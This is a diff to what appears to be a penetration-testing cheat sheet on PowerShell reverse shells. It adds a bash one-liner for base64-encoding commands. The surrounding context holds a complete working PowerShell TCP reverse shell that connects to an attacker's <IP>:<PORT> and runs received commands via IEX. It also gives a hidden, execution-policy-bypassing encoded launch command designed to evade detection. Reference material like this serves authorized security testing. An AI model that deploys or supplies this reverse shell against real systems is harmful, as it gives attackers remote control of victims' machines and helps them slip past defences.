@@ -320,12 +320,16 @@ Starting PowerShell with the straight reverse shell command, `powershell -c
 `base64` oftentimes proves to be more successful.
 
 ```
+# Conversion to base64 in PowerShell.
 # Can be executed on attacking system, to  encode in base64 the reverse shell script.
 $cmd = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
 $EncodedCmd =[Convert]::ToBase64String($Bytes)
 $EncodedCmd
+
+# Conversion to base64 in bash.
+echo "<COMMAND>" | iconv --to-code UTF-16LE | base64 -w 0
 
 powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>
 ```
